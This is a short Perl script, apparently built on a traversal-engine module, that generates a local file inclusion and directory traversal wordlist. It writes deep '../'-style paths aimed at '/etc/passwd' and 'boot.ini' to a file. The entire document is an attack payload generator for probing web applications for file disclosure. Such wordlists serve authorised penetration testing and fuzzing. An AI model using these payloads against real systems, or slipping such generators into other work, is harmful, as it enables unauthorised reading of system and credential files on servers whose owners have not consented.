
use lib qw(.);
use TraversalEngine;


my $OS = "windows";
my $min_deep = 7; # 1
my $deep = 7;
my @files = ("/etc/passwd", "boot.ini");

#output file
open(FH, '>', "lfi_directory_traversal_wordlist.txt") or die $!;


$counter = 0;
foreach $file (@files) {
    print FH $file . "\n"; # output to file
    @traversals = TraversalEngine($OS, $min_deep, $deep, $file);
    foreach $trav (@traversals) {
        print FH $trav . "\n"; # output to file
        $counter = $counter + 1;
    }
}


print "\n\n[+] " . $counter . " paths generated --> lfi_directory_traversal_wordlist.txt";

